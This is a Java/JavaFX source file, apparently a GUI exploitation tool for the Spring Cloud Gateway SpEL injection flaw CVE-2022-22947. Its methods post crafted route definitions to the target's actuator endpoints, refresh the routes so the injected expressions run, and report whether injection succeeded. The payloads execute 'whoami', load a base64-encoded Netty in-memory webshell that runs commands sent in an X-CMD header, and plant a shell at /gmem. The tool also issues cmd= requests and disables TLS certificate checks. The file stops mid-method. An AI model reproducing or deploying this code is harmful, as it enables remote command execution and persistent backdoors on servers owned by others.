import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.embed.swing.JFXPanel;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.StackPane;
import javafx.scene.layout.VBox;
import jdk.internal.org.objectweb.asm.tree.analysis.Value;
import jdk.nashorn.internal.objects.NativeError;
import jdk.nashorn.internal.objects.annotations.Constructor;
import net.sf.json.JSONArray;
import net.sf.json.JSONObject;
import sun.net.www.http.HttpClient;
import sun.nio.ch.Net;
import javafx.scene.control.ComboBox;

import java.io.*;
import java.net.*;
import java.net.HttpURLConnection;

import javax.net.ssl.*;
import javax.print.DocFlavor;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.time.Duration;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


import static sun.net.www.http.HttpClient.*;


public class Ff {







    @FXML
    private Button Click1;

    @FXML
    private Button Click;

    @FXML
    private TextArea responsetest;

    @FXML
    private TextArea responsetest2;


    @FXML
    private TextField urlTest;

    @FXML
    private TextField urltest1;

    @FXML
    private TextField urltest5;


    @FXML
    private ComboBox<?> chbox;






    private JFXPanel primaryStage;

    @FXML
    void Clickevent2(ActionEvent event) {
        send8();
    }

    @FXML
    void Clickevent3(ActionEvent event) {
        //  sendGetRequest1();

        //   send5();
        rce2();
    }


    @FXML
    private TextField urltest4;
    private TextArea fd;

    @FXML
    private TextArea responsetest11;

    @FXML
    private TextArea responsetest1;


    @FXML
    void send4(ActionEvent event) {

        send6();


    }



    @FXML
    void rce(ActionEvent event) {





    }


    public void send8(){

        String url = urlTest.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }

        try {
            //    System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");
            URL url1 = new URL(url + "/actuator/gateway/routes/test113");
            //       URL url1 = new URL(url + "/cttl/cmd?r=cat /etc/passwd");
            //       URL url1 = new URL(url+"/cttl/cmd?r="+urltest1.getText());
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");

            //     System.out.println("Response Code : " + responseCode);

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
            }
    //        responsetest2.appendText(response.toString());




       //     response.append(inputLine);
          //  String regex = "\"AddResponseHeader\":\\\"([^\"]*)\\\"";
      //      Pattern pattern = Pattern.compile(regex);
        //    Matcher matcher = pattern.matcher(response);
      //      if (matcher.find()) {
          //      String value = matcher.group(0); // 提取匹配的值（这里是name的值）
           //    responsetest2.appendText("返回标识:"+value+"\n");
          //  } else {
          //      responsetest2.appendText("返回标识:"+"\n");
        //    }




            //      JSONArray filtersArray = jsonObject.getJSONArray("filters");
            //       for (int i = 0; i < filtersArray.toArray().length; i++) {

            //     Object filterElement = filtersArray.get(i);
            //       System.out.println(filterElement);;




        } catch (Exception e) {

            e.printStackTrace();

        }
    }


    @FXML
    private ComboBox<?> uurltest4;


    @FXML
    //private HttpClient client=HttpClient.newHttpClient();


    public void rce() {





}

    public void ceshi() {


    }

    public void rce2() {

        try {


            Button button = new Button();
            System.setProperty("https.proxyHost", "127.0.0.1");
            System.setProperty("https.proxyPort", "8080");

            //          responsetest.appendText("开始检测Spring Cloud Gateway RCE(CVE-2022-22947)"+"\n");
            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            //  配置认证管理器
            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
//  激活主机认证
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  Button button = new Button("Click");
            //      fd = new TextArea();


            String url = urlTest.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            //     if (isValidUrl(url)) {

            //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
            if (!isValidUrl(url)) responsetest.appendText("输入的不是有效的网址" + "\n");
            else {

            }
            URL url1 = new URL(url + "/actuator/gateway/routes/test113");

            String json = "{\n" +
                    "  \"id\": \"test\",\n" +
                    "  \"filters\": [{\n" +
                    "    \"name\": \"AddResponseHeader\",\n" +
                    "    \"args\": {\n" +
                    "      \"name\": \"Result\",\n" +
                    "      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"whoami\\\"}).getInputStream()))}\"\n" +
                    "    }\n" +
                    "  }],\n" +
                    "  \"uri\": \"http://example.com\"\n" +
                    "}";
            String json1 = "{\n" +
                    "      \"id\": \"test\",\n" +
                    "      \"filters\": [{\n" +
                    "        \"name\": \"AddResponseHeader\",\n" +
                    "        \"args\": {\"name\": \"Result\",\"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('NettyMemshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBFAoAPgB9CAB+BwB/CABTBwCACgAFAIEKAIIAgwcAhAoAggCFCgCGAIcKAIYAiAoACACJCgAFAIoIAIsKAIwAjQgASwoABQCOCgCPAIMKAI8AkAoABQCRCABOCACSBwCTCgAXAH0KAI8AlAgAlQcAlggAlwsAmACZCACaCACbCwCcAJ0HAJ4LACEAnwgAoAoAoQCiCgChAKMHAKQKAKUApgoApQCnCgCoAKkKACYAqggAqwoAJgCsCgAmAK0JAK4ArwoAFwCwCgAbALELALIAswcAtAkAtQC2CQC3ALgKALkAugoAMgC7CwC8AJ8JAL0AvggAvwoAoQDACwCyAMEJAMIAwwsAxADFBwDGBwDHAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAyAcAyQcAhAcAlgEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsHAJ4BAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAygDLBwDJDADMAM0BABBqYXZhL2xhbmcvT2JqZWN0DADOAM8HANAMANEA0gwA0wDUDADVANYMANcASAEADk5ldHR5V2ViU2VydmVyBwDIDADYANkMANoA2wcA3AwA0wDdDADeANYBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADfAOABAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHAOEMAGcA4gEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDjDADkAOUBACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOYA5wEABVgtQ01EBwDoDADYAOkMANMA6gEAEWphdmEvdXRpbC9TY2FubmVyBwDrDADsAO0MAO4A7wcA8AwA8QDyDABAAPMBAAJcQQwA9AD1DAD2AEgHAPcMAPgAeAwAdAB1DAD5AEEHAPoMAPsA/AEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA/QwA/gD/BwEADAEBAQIHAQMMAQQBBQwAQAEGBwEHBwEIDAEJAQoBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADfAQsMAQwBDQcBDgwBDwEQBwERDAESARMBACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQANd3JpdGVBbmRGbHVzaAEANChMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZTsBACZpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmVMaXN0ZW5lcgEABUNMT1NFAQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyOwEAHmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZQEAC2FkZExpc3RlbmVyAQBSKExpby9uZXR0eS91dGlsL2NvbmN1cnJlbnQvR2VuZXJpY0Z1dHVyZUxpc3RlbmVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwAhABcAPgABAD8AAAAFAAEAQABBAAEAQgAAAC8AAQABAAAABSq3AAGxAAAAAgBDAAAABgABAAAAFgBEAAAADAABAAAABQBFAEYAAAAJAEcASAABAEIAAAHDAAQACgAAALUSAksSAxIEA70ABbYABkwrBLYABysBA70ACLYACU0DPh0suAAKogCHLB24AAs6BBkExgB1GQS2AAy2AA0SDrYAD5kAZRkEtgAMEhC2ABE6BRkFBLYAEhkFGQS2ABM6BhkGtgAMtgAUEhW2ABE6BxkHBLYAEhkHGQa2ABM6CBkItgAMtgAUtgAUEha2ABE6CRkJBLYAEhkJGQi7ABdZtwAYtgAZEhpLhAMBp/93pwAHTBIcSyqwAAEAAwCsAK8AGwADAEMAAABaABYAAAAYAAMAGgAPABsAFAAcAB4AHgAoAB8ALwAgAEQAIQBQACIAVgAjAF8AJABuACUAdAAmAH0AJwCPACgAlQApAKMAKgCmAB4ArAAvAK8ALQCwAC4AswAwAEQAAABwAAsAUABWAEkASgAFAF8ARwBLAEwABgBuADgATQBKAAcAfQApAE4ATAAIAI8AFwBPAEoACQAvAHcAUABMAAQAIACMAFEAUgADAA8AnQBTAFQAAQAeAI4AVQBMAAIAsAADAFYAVwABAAMAsgBYAFkAAABaAAAAHgAF/wAgAAQHAFsHAFwHAF0BAAD7AIX4AAVCBwBeAwABAF8AYAACAEIAAAB2AAUABQAAABwsuQAdAQA6BBkEEh4SH7sAF1m3ABi5ACAEAFexAAAAAgBDAAAADgADAAAANgAIADgAGwA5AEQAAAA0AAUAAAAcAEUARgAAAAAAHABhAGIAAQAAABwAYwBkAAIAAAAcAGUAZgADAAgAFABnAGgABABpAAAADQMAYQAAAGMAAABlAAAAAQBqAGsAAwBCAAABEAAEAAYAAABhLMEAIZkAVCzAACFOLbkAIgEAEiO2ACSZADctuQAiAQASI7YAJToEuwAmWbgAJxkEtgAotgAptwAqEiu2ACy2AC06BSorGQWyAC63AC+xpwAKOgQZBLYAMCssuQAxAgBXsQABAAwATQBRABsAAwBDAAAAMgAMAAAAPwAHAEAADABCABoAQwAnAEQAQwBGAE0ARwBOAEsAUQBJAFMASgBYAE0AYABOAEQAAABIAAcAJwAnAGwAWQAEAEMACwBtAFkABQBTAAUAVgBXAAQADABMAG4AbwADAAAAYQBFAEYAAAAAAGEAcABxAAEAAABhAFgATAACAFoAAAAPAAP8AE4HAHJCBwBe+gAGAHMAAAAEAAEAGwBpAAAACQIAcAAAAFgAAAACAHQAdQACAEIAAACUAAYABQAAADa7ADJZsgAzLSyyADS4ADW3ADY6BBkEuQA3AQCyADgSObYAOlcrGQS5ADsCALIAPLkAPQIAV7EAAAACAEMAAAASAAQAAABSABQAUwAkAFQANQBVAEQAAAA0AAUAAAA2AEUARgAAAAAANgBwAHEAAQAAADYAdgBZAAIAAAA2AHcAeAADABQAIgB5AHoABABpAAAADQMAcAAAAHYAAAB3AAAAAQB7AAAAAgB8'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}\"}\n" +
                    "        }],\n" +
                    "      \"uri\": \"http://example.com\",\n" +
                    "      \"order\": 0\n" +
                    "}";

            String json2 = "{\n" +
                    "\"predicates\":[{\"name\": \"Path\",\n" +
                    "\"args\":{\"_genkey_0\":\"/gmem**\"}\n" +
                    "}\n" +
                    "],\n" +
                    "  \"id\": \"wolaile\",\n" +
                    "  \"filters\": [{\n" +
                    "    \"name\": \"AddResponseHeader\",\n" +
                    "    \"args\": {\n" +
                    "      \"name\": \"Result\",\n" +
                    "      \"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('com.example.GMemShell',T(org.springframework.util.Base64Utils).decodeFromString(''),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'/gmem')}\"\n" +
                    "    }\n" +
                    "  }],\n" +
                    "  \"uri\": \"http://test.com\"\n" +
                    "}";
            //     String json2= fd.toString();

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);


            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json2.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();


            //     connection.setRequestProperty("accept", "*/*");
            //   connection.setRequestProperty("connection", "Keep-Alive");\
            //         connection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            //      connection.setRequestProperty("Content-Type", "application/json");
            //      BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            //   connection.setDoOutput(true);


            //       connection.disconnect();

            os.write(input, 0, input.length);
            os.flush();
            //  String response=br.readLine();
            int responseCode = connection.getResponseCode();

            if (responseCode == 201) {
                send5();
                responsetest1.appendText("目标:" + url +"\n" + "注入成功" + "\n");
                responsetest1.appendText( "/gmem" + "\n");

            }
            else{

                responsetest1.appendText("目标:" + url + "\n" + " 注入失败" + "\n");
            }
        } catch (ProtocolException e) {
            throw new RuntimeException(e);
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (KeyManagementException e) {
            throw new RuntimeException(e);
        }
    }

    public void rce1(){

        responsetest.setText("");
        responsetest1.setText("");


    }

    public void daili() {


        //     System.setProperty("java.net.useSystemProxies", "true");
        //   System.setProperty("http.proxyHost", "127.0.0.1");
        //     System.setProperty("http.proxyPort", "8080");
        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8080));

    }


    //命令执行
    public void send6() {


        Button button = new Button("Click");
        //  TextField tf = new TextField();




            String url = urlTest.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            try {
                //  TextField tf = new TextField();
                //     if (tf.getText().equals("")) {
                // Alert alert = new Alert(Alert.AlertType.INFORMATION);
                //   alert.setTitle("SORRY!");
                //    alert.setHeaderText("");
                //    alert.setContentText("请先检测漏洞是否存在再执行命令");
                //   alert.showAndWait();

                //  } else {


                //  System.setProperty("http.proxyHost", "127.0.0.1");
                //    System.setProperty("http.proxyPort", "8080");
                URL url1 = new URL(url + "/?cmd=ipconfig");
                //         String json3="X-CMD:"+urltest4.getText();
                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                //        OutputStream os = connection.getOutputStream();
                //       byte[] input=json3.getBytes(StandardCharsets.UTF_8);
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                //       connection.disconnect();

                //    os.write(input,0,input.length);
                int responseCode = connection.getResponseCode();

                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                String inputLine;
                //    response.append(inputLine = br.readLine());
                while ((inputLine = br.readLine()) != null) {
                }
                response.append(inputLine);
                      br.close();


                responsetest2.appendText(response.toString());


            } catch (Exception e) {

                //   e.printStackTrace();
                responsetest2.appendText("命令执行失败，网络异常" + "\n");
                //     Alert alert = new Alert(Alert.AlertType.INFORMATION);
                //     alert.setTitle("SORRY!");
                //     alert.setHeaderText("");
                //    alert.setContentText("命令执行失败");
                //    alert.showAndWait();
            }



    }

    public void send3() {

        String url = urlTest.getText();
        try {
            //       System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");
            URL url1 = new URL(url + "/actuator/gateway/routes/test");
            //  URL url1 = new URL(url+"/cttl/cmd?r="+urltest1.getText());
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("DELETE");
            int responseCode = connection.getResponseCode();
            System.out.println("Response Code : " + responseCode);
            if (responseCode == 200 || responseCode == 201) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

                StringBuffer response = new StringBuffer();
                response.append(br.readLine());
                responsetest.appendText("...." + "\n" + "...." + "\n");

            }
        } catch (Exception e) {
            e.printStackTrace();
        }


    }

    public void send2() {


        String url = urlTest.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }

        try {
            //    System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");
            URL url1 = new URL(url + "/actuator/gateway/routes/test113");
            //       URL url1 = new URL(url + "/cttl/cmd?r=cat /etc/passwd");
            //       URL url1 = new URL(url+"/cttl/cmd?r="+urltest1.getText());
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");

            //     System.out.println("Response Code : " + responseCode);

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
                responsetest.appendText(response.toString());
            }





      response.append(inputLine);
          String regex = "\"predicate\":\\\"([^\"]*)\\\"";
         Pattern pattern = Pattern.compile(regex);
          Matcher matcher = pattern.matcher(response);
           if (matcher.find()) {
               String value = matcher.group(1); // 提取匹配的值（这里是name的值）
          responsetest.appendText("返回标识:"+value+"\n");
          } else {
              // responsetest.appendText("返回标识:"+value);
        }

  //    responsetest.appendText(response.toString());


            //      JSONArray filtersArray = jsonObject.getJSONArray("filters");
              //       for (int i = 0; i < filtersArray.toArray().length; i++) {

              //     Object filterElement = filtersArray.get(i);
              //       System.out.println(filterElement);;




        } catch (Exception e) {

    e.printStackTrace();

        }
    }


    public void send5() {

        String url = urlTest.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {
            //   Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8080));
            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");






            URL url1 = new URL(url + "/actuator/gateway/refresh");
            //  URL url1 = new URL(url+"/cttl/cmd?r="+urltest1.getText());
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("POST");
            int responseCode = connection.getResponseCode();
            System.out.println("Response Code : " + responseCode);
            if (responseCode == 200) {
             //   responsetest.setText("重置OK!");
     //           BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

        //        StringBuffer response = new StringBuffer();
        //   }

          //      responsetest2.appendText("注入成功/gmem");

//  /      //        responsetest.appendText("【+】可能存在Springboot Gateway漏洞" + "\n" + "RCE命令开启");
        //    } else {

           //     responsetest.appendText("不存在Sringboot Gateway网关命令漏洞" + "\n");
            }


        } catch (Exception e) {
        }
    }

    public void send1() {
        try {

            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //    System.setProperty("http.proxyPort", "8080");
            String url = urlTest.getText();
            URL url1 = new URL(url + "/actuator/gateway/refresh");
            String json = "";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            OutputStream os = connection.getOutputStream();
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setDoOutput(true);
            os.write(input, 0, input.length);
            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {

                responsetest.appendText("【+】可能存在Springboot Gateway漏洞" + "\n" + "RCE命令开启" + "\n");

            } else {

                //     responsetest.appendText(url1+"不存在Sringboot Gateway网关命令漏洞"+"\n"+"检测完毕"+"\n");
            }


        } catch (MalformedURLException e) {
            e.printStackTrace();


        } catch (IOException e) {

        }

    }

    private boolean isValidUrl(String url) {
        // 使用正则表达式来验证URL格式。这里只是一个简单的示例，可能需要根据实际需求进行调整。
        // 注意：这个正则表达式可能无法覆盖所有有效的网址格式。
        String urlRegex = "^(http|https)://[^\\s]*$"; // 这个正则表达式匹配以http或https开头的网址，不包括空格。
        return url.matches(urlRegex);

    }



    public void sendGetRequest1() {


        try {


            Button button=new Button();
            System.setProperty("https.proxyHost", "127.0.0.1");
            System.setProperty("https.proxyPort", "8080");

            //          responsetest.appendText("开始检测Spring Cloud Gateway RCE(CVE-2022-22947)"+"\n");
            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            //  配置认证管理器
            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
